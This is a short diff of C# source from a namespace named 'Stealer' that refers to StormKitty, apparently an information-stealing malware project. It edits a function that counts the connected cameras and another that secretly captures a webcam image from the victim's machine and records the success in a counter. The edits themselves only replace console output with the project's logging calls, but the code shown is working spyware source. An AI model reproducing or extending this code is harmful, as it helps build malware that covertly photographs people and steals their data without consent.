@@ -26,9 +26,7 @@ namespace Stealer
 				using (var searcher = new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
 					foreach (var device in searcher.Get())
 						cameras++;
-			} catch { Console.WriteLine("GetConnectedCamerasCount : Query failed"); }
-			
-			
+			} catch { StormKitty.Logging.Log("GetConnectedCamerasCount : Query failed"); }
 			return cameras;
 		}
 
@@ -40,8 +38,10 @@ namespace Stealer
 				return false;
 
 			// If connected one camera
-			if (GetConnectedCamerasCount() != 1)
-				return false;
+			int count = GetConnectedCamerasCount();
+			if (count != 1)
+				return StormKitty.Logging.Log($"WebcamScreenshot : Camera screenshot failed. (Count {count})", false);
+
 			try
 			{
 				Clipboard.Clear();
@@ -65,8 +65,7 @@ namespace Stealer
 				Counter.WebcamScreenshot = true;
 			}
 			catch (Exception ex) {
-				Console.WriteLine(ex);
-				return false;
+				return StormKitty.Logging.Log("WebcamScreenshot : Camera screenshot failed.\n" + ex, false);
 			};
 
 			return true;
